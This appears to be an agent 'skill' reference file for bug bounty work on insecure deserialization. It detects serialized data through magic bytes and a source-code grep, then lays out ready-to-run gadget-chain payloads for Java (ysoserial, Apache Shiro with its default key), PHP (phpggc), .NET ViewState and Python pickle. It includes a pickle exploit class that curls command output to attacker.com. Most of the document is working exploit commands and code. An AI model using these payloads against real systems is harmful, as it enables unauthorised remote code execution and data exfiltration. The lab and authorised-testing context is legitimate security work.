# Insecure Deserialization Skill

**Trigger:** Insecure deserialization, gadget chain, ysoserial, phpggc, pickle, rO0AB, ViewState, unserialize, readObject
**Pattern Note:** `a technique-reference note`
**PortSwigger:** 8 labs | **Ceiling:** Critical (RCE $10K–$50K)

---

## Detection — Magic Bytes Quick Reference

| Platform | Hex Signature | Base64 Prefix | Location |
|----------|--------------|---------------|----------|
| Java native | `AC ED 00 05` | `rO0AB...` | Cookies, JWT, POST body |
| Java GZIP | `1F 8B` | `H4sI...` | Compressed streams |
| PHP | `O:8:` / `a:2:` | Varies | Cookies, session files |
| Python pickle | `80 02` / `80 04` | `gASV...` | Flask sessions, Redis, .pkl files |
| .NET ViewState | `AAEAAAD` | `/w...` | `__VIEWSTATE` hidden field |
| Ruby Marshal | `04 08` | `BAh...` | Cookies, session files |

**Quick grep for source code:**
```bash
grep -rn "readObject\|unserialize\|pickle.loads\|Marshal.load\|BinaryFormatter" src/
```

---

## Phase 1 — Safe Detection (URLDNS)

Always start with URLDNS — confirms deserialization without RCE:

```bash
# Generate DNS-only payload
java -jar ysoserial.jar URLDNS 'http://YOUR.COLLABORATOR.HOST'

# Encode and submit in target cookie/param
java -jar ysoserial.jar URLDNS 'http://abc123.burpcollaborator.net' | base64 -w0
```

If Collaborator receives DNS hit → deserialization confirmed → escalate to RCE chain.

---

## Phase 2 — Java RCE (ysoserial)

```bash
# Java 16+ requires compatibility flag:
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
     -jar ysoserial.jar CommonsCollections6 'curl http://COLLABORATOR/$(id|base64)' | base64 -w0

# Try chains in order (depends on classpath — CommonsCollections6 is broadest):
CommonsCollections6   → CC6 — broad compatibility, no reflection restrictions
CommonsCollections1   → CC1 — requires Java < 8u71
Spring1               → Spring Framework apps
ROME                  → ROME RSS library
Groovy1               → Groovy on classpath

# Apache Shiro (CBC padding oracle + default key):
python3 shiro_exploit.py -t https://target.com/login -c 'id'
# Default key: kPH+bIxk5D2deZiIxcaaaA==
```

---

## Phase 3 — PHP (PHPGGC)

```bash
# List available gadget chains:
phpggc -l

# Generate payload for common frameworks:
phpggc Symfony/RCE4 system id -b      # base64 output
phpggc Laravel/RCE1 exec 'id' -b
phpggc Yii/RCE1 system id -b
phpggc Monolog/RCE1 system id -b
```

---

## Phase 4 — Python Pickle RCE

```python
import pickle, os, base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/$(id|base64)',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
# Inject into Flask session cookie, Redis cache, or any pickle-deserializing input
```

---

## Phase 5 — .NET ViewState

```bash
# ysoserial.net (https://github.com/pwntester/ysoserial.net)
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c 'whoami > c:\output.txt'
ysoserial.exe -f LosFormatter -g TextFormattingRunProperties -c whoami

# ViewState (when MachineKey known from web.config leak):
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c whoami \
  --validationalg="SHA1" --validationkey="[key]"
```

---

## PortSwigger Lab Quick Reference

| Lab | Platform | Key Technique |
|----|----------|---------------|
| Modifying serialized objects | PHP | Edit boolean/int in raw serialize string |
| Modifying serialized data types | PHP | Type juggling: string→int comparison |
| Arbitrary object injection in PHP | PHP | Supply gadget class → `__destruct` |
| Java deserialization with Apache Commons | Java | ysoserial CommonsCollections |
| PHP deserialization pre-built gadget chain | PHP | phpggc Symfony/Monolog |
| Ruby deserialization documented gadget | Ruby | Marshal + gadget |
| Custom gadget chain for Java | Java | Manual chain construction |

---

## Bug Bounty Notes

- Always start with URLDNS — zero risk of breaking anything
- Java gadget chain index: CommonsCollections6 → CommonsCollections1 → Spring1 → ROME
- PHP: check composer.json for framework → match to phpggc chain list
- Python pickle: focus on ML endpoints (.pkl model files) — growing attack surface
- Shiro `rememberMe` cookie is the #1 real-world Java deserialization target
- CVSS: 9.8 by default — network-accessible, no auth required, full RCE

---

*Skill: insecure-deserialization | Created 2026-03-04 (KB Part 1 ingestion) | Pattern: Cyber-Insecure-Deserialization.md*
